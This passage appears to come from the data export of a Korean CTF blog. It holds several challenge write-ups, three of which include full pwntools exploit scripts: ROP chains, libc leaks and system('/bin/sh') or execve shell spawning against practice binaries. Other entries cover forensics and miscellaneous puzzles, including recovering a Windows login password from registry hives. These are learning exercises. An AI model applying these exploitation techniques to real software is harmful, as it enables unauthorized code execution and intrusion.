있다. 즉, 바로 버퍼의 바로 뒤에 위치해 있다는 소리다. 고로 buf + sfp[rbp+0h] + RTL[binsh+system]이 들어갈 최종 페이로드가 된다. 이후부터는 스무스하게 슥삭 진행하면 익스 성공! 123456789101112131415161718192021222324252627from pwn import *r = process('./r0pbaby')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')binsh_offset = libc.search('/bin/sh').next()system_offset = libc.symbols['system']pr = 0x21102 # pop rdi; retr.sendlineafter(\": \", \"2\")r.sendlineafter(\": \", \"system\")r.recvuntil(\"0x\")system_addr = int(r.recv(16), 16)libc_base = system_addr - system_offsetpr_addr = libc_base + prbinsh_addr = libc_base + binsh_offsetr.sendlineafter(\": \", \"3\")r.sendline(\"32\")payload = \"A\"*8payload += p64(pr_addr)payload += p64(binsh_addr)payload += p64(system_addr)r.sendline(payload)r.interactive() [Exploit Code] img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Pwn","slug":"WriteUps/Pwn","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Pwn/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"TRUST CTF 2019 start","slug":"pwnstart","date":"2019-02-15T05:40:00.000Z","updated":"2019-05-24T13:15:03.107Z","comments":true,"path":"2019/02/15/pwnstart/","link":"","permalink":"http://j0n9hyun.github.io/2019/02/15/pwnstart/","excerpt":"","text":"start Binary File 123456789sub_4005E6 proc near; __unwind &#123;push rbpmov rbp, rsppop raxpop rdxpop rdipop rsiretn [sub_4005E6] 4개의 sub 함수 중 4005E6에는 pop gadget이 있다. 123456789__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char buf; // [rsp+0h] [rbp-10h] setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); read(0, &amp;buf, 0x78uLL); return 0LL;&#125; [main] 바이너리 파일을 뜯어보면 sub로 시작하는 함수 4개와 메인함수가 있다. 언뜻봐도 알 수 있듯이 read 함수에서 BOF 취약점이 터지는 것을 확인할 수 있다. 보통은 write 같은 함수가 주어져야 하는데 read 함수밖에 없는 걸로 보아 일반적으로 하는 ROP 기법은 사용할 수 없다. 그래서 같이 주어져 있는 libc 파일에서 syscall 가젯을 사용한다. 주소값의 하위 3비트는 고정적인 값을 지니고 있기 때문에 read의 libc 주소 1 바이트를 syscall의 하위 1 바이트 주소로 바꿔서 보내면 된다. 123456789101112131415161718192021222324252627282930from pwn import *#r = remote('server.trustctf.com', 10392)r = process('./start')e = ELF('./start')pr = 0x4005ed # pop rsippppr = 0x4005ea # pop rax,rdx,rdi,rsicmd = \"/bin/sh\\x00\"syscall = \"\\x7b\"payload = \"\"payload += \"A\"*24payload += p64(pr)payload += p64(e.bss())payload += p64(e.plt['read'])payload += p64(pr)payload += p64(e.got['read'])payload += p64(e.plt['read'])payload += p64(ppppr)payload += p64(59)payload += p64(0)payload += p64(e.bss())payload += p64(0)payload += p64(e.plt['read'])payload += cmdr.sendline(payload)r.send(syscall)r.interactive() [Exploit Code] img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Pwn","slug":"WriteUps/Pwn","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Pwn/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"디미고 TRUST CTF 2019 1등","slug":"trust1st","date":"2019-02-14T16:00:00.000Z","updated":"2019-05-25T14:04:51.143Z","comments":true,"path":"2019/02/15/trust1st/","link":"","permalink":"http://j0n9hyun.github.io/2019/02/15/trust1st/","excerpt":"","text":"대회 후기 [1등!!!] 낮 12시부터 시작해서 자정까지 총 12시간동안 진행하는 디미고 CTF 대회였다. 좀 아쉬웠던 부분이라고 하면 포너블 문제가 죄다 막혀서 하나도 못 풀었다...아직 내공이 더 필요한 거 같다. 참여한 팀원들 모두 고생했고 또 있을 대회에 상위권으로 들 수 있도록 화이팅!","categories":[{"name":"Daily","slug":"Daily","permalink":"http://j0n9hyun.github.io/categories/Daily/"}],"tags":[]},{"title":"CODEGATE 2018 BaskinRobbins31","slug":"baskinrobbins31","date":"2019-02-05T03:42:00.000Z","updated":"2019-05-24T13:15:08.979Z","comments":true,"path":"2019/02/05/baskinrobbins31/","link":"","permalink":"http://j0n9hyun.github.io/2019/02/05/baskinrobbins31/","excerpt":"","text":"BaskinRobbins31 Binary File [사진 1-1] 우리가 아는 그 베라 게임이다. 하지만 일반적인 방법으로는 이길 수 없다. [사진 1-2] 필승법으로 이겨보려 하지만 치트를 쓴다. 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *r = process('./baskin')e = ELF('./baskin')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')puts_offset = libc.symbols['puts']system_offset = libc.symbols['system']binsh_offset = libc.search('/bin/sh').next()your_turn = e.symbols['your_turn']puts_plt = e.plt['puts']puts_got = e.got['puts']pr = 0x400bc3payload = \"\"payload += \"\\x90\"*184payload += p64(pr)payload += p64(puts_got)payload += p64(puts_plt)payload += p64(your_turn)r.sendline(payload)r.recvuntil(\"...:(\")r.recvline()leaked = u64(r.recv(6).ljust(8, \"\\x00\"))libc_base = leaked - puts_offsetsystem_addr = libc_base + system_offsetbinsh_addr = libc_base + binsh_offsetpayload2 = \"\"payload2 += \"\\x90\"*184payload2 += p64(pr)payload2 += p64(binsh_addr)payload2 += p64(system_addr)r.sendlineafter(\"(1-3)\", payload2)r.recvlines(4)r.interactive() [Exploit Code] 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *r = process('./baskin')e = ELF('./baskin')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')puts_offset = libc.symbols['puts']system_offset = libc.symbols['system']binsh_offset = libc.search('/bin/sh').next()your_turn = e.symbols['your_turn']puts_plt = e.plt['puts']puts_got = e.got['puts']pr = 0x400bc3def leak(): global leaked payload = \"\" payload += \"\\x90\"*184 payload += p64(pr) payload += p64(puts_got) payload += p64(puts_plt) payload += p64(your_turn) r.sendline(payload) r.recvuntil(\"...:(\") r.recvline() leaked = u64(r.recv(6).ljust(8, \"\\x00\"))def offset(): global system_addr, binsh_addr libc_base = leaked - puts_offset system_addr = libc_base + system_offset binsh_addr = libc_base + binsh_offsetdef exploit(): payload2 = \"\" payload2 += \"\\x90\"*184 payload2 += p64(pr) payload2 += p64(binsh_addr) payload2 += p64(system_addr) r.sendlineafter(\"(1-3)\", payload2) r.recvlines(4) r.interactive()if __name__ == \"__main__\": leak() offset() exploit() [Exploit Code #2] img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Pwn","slug":"WriteUps/Pwn","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Pwn/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"NEWSECU CTF 2019 Easy_Forensics (1)","slug":"easy_forensics1","date":"2019-02-01T16:00:00.000Z","updated":"2019-05-24T13:16:58.092Z","comments":true,"path":"2019/02/02/easy_forensics1/","link":"","permalink":"http://j0n9hyun.github.io/2019/02/02/easy_forensics1/","excerpt":"","text":"Easy_Forensics (1) [시작 화면] 2.2G 용량의 윈도우7 가상머신 파일이 있다. 시작하면 로그인 화면에서 암호를 입력해야 하기 때문에 진입을 못한다. 이 암호가 무엇인지 알아내면 정답이다. [vmdk 파일 추출] 그러려면 우선 vm파일을 추출하는 과정이 필요한데 FTK Imager를 이용하면 추출이 가능하다. 내용물 전부 추출할 필요는 없다 하이브 파일이 들어있는 폴더만 가져온다. [Registry Analysis Tool] 이후 레지스트리 분석 도구를 이용해 사용자 계정 정보를 확인한다. 3번째에 있는 nolja 계정에 Secret 이름이 있는 것을 보면 우리가 원하는 정보는 이것임을 알 수 있다. 계정 정보에는 NT해쉬도 같이 저장되는데 이 NT해쉬가 바로 암호를 말하는 것이다. [복호화 성공!] 암호를 입력하면 환영합니다 메세지를 볼 수 있을 것이다. flag{st4rt} img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Foren","slug":"WriteUps/Foren","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Foren/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"NEWSECU CTF 2019 Secret_code_from","slug":"secret_code_from","date":"2019-01-31T11:27:00.000Z","updated":"2019-05-24T13:15:18.223Z","comments":true,"path":"2019/01/31/secret_code_from/","link":"","permalink":"http://j0n9hyun.github.io/2019/01/31/secret_code_from/","excerpt":"","text":"Secret_code_from [워드 파일] 워드 파일이 하나 주어진다. 열어보면 무언가 써있는데 축소해서 보면 확인할 수 있다. 보는 시야를 달리하면 쉽게 풀 수 있었던 문제! flag{can_you_see_me?} img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Misc","slug":"WriteUps/Misc","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Misc/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"NEWSECU CTF 2019 선물문제","slug":"present","date":"2019-01-30T14:10:00.000Z","updated":"2019-05-30T05:53:52.245Z","comments":true,"path":"2019/01/30/present/","link":"","permalink":"http://j0n9hyun.github.io/2019/01/30/present/","excerpt":"","text":"선물문제(저놈 잡아라) [문제 이미지] 해당 사진을 보고 버스번호와 건물명을 맞추는 문제이다. 버스 노선 검색 결과, 급행버스이고 남양주시 -> 강남역(종착)을 향하는 버스번호는 1700 하나뿐이다. 헤맨 이유는 도로명 때문이었는데 이것 때문에 손 브루트포싱(?)을 좀 많이 했다. '점X밀X노'인 줄 알고 계속 넣었는데 안 되길래 다시 검색해본 결과, 다른 건물이었다(...) [길찾기 서비스로 확인한 결과] 건물이름 하고 우측에도 흰 공백이 더 있더라니 '점X밀X노'는 함정이었다. 이런! Flag : SPAO_1700 img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Misc","slug":"WriteUps/Misc","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Misc/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"NEWSECU CTF 2019 Goback","slug":"goback","date":"2019-01-30T11:01:00.000Z","updated":"2019-05-24T13:15:34.464Z","comments":true,"path":"2019/01/30/goback/","link":"","permalink":"http://j0n9hyun.github.io/2019/01/30/goback/","excerpt":"","text":"Goback [문제 파일] 3개의 파일이 주어져있다. hwp은 한글파일의 확장자이다. 한글을 통해서 열어보자. [hwp 파일 내용] 끝에 보면 하트 모양 그림이 있는데 플래그의 냄새가 솔솔 난다. (근데 대회 진행 중에 봤을 땐 이 그림을 못 봤던 거 같은데 기분 탓인가?) 좌우간 해당 이미지를 다운로드 받아보자 파일 - 문서 정보를 들어가면 이미지 추출이 가능하다.(단축키는 Ctrl + Q + I) 파일을 열어보면 깨져서 나온다. Hxd로 확인해보자. 시그니처는 이상 없고 Ctrl + F로 플래그를 검색해보니 최하단에서 플래그를 확인할 수 있다. img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Misc","slug":"WriteUps/Misc","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Misc/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"NEWSECU CTF 2019 Base64","slug":"base64","date":"2019-01-30T06:00:28.000Z","updated":"2019-05-24T13:15:30.288Z","comments":true,"path":"2019/01/30/base64/","link":"","permalink":"http://j0n9hyun.github.io/2019/01/30/base64/","excerpt":"","text":"Base64 디코딩을 3번 하면 풀리는 문제다. 12345671 from pwn import *2 import base643 r = remote('35.237.96.115', 1357)4 for i in range(3):5 result = base64.decodestring(r.recvline())6 r.sendlineafter(\": \", result)7 r.interactive() 근데 더 줄일 수도 있다! 사실 위 코드 또한 import base64를 제외해도 pwntools 안에 base64 모듈이 내장돼 있기 때문에 정상적으로 작동이 된다. b64d는 pwntools에서 사용할 수 있는 함수다. 기능은 decodestring과 동일하다. 1234561 from pwn import *2 r = remote('35.237.96.115', 1357)3 for i in range(3):4 result = b64d(r.recvline())5 r.sendlineafter(\": \", result)6 r.interactive()","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Misc","slug":"WriteUps/Misc","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Misc/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"NEWSECU CTF 2019 Solidity","slug":"solidity","date":"2019-01-30T05:47:28.000Z","updated":"2019-05-24T13:15:38.112Z","comments":true,"path":"2019/01/30/solidity/","link":"","permalink":"http://j0n9hyun.github.io/2019/01/30/solidity/","excerpt":"","text":"Solidity 문제에 Ropsten 주소가 주어진다. 0x74b841a9d926db89b2cfeef454a75d178feda06f 이 주소를 기반으로 거래내역을 살펴보면 위와 같이 나타난다. 거래내역을 하나하나 살펴보면 플래그가 입력되어 있는 것을 볼 수 있다. img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Misc","slug":"WriteUps/Misc","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Misc/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]}]}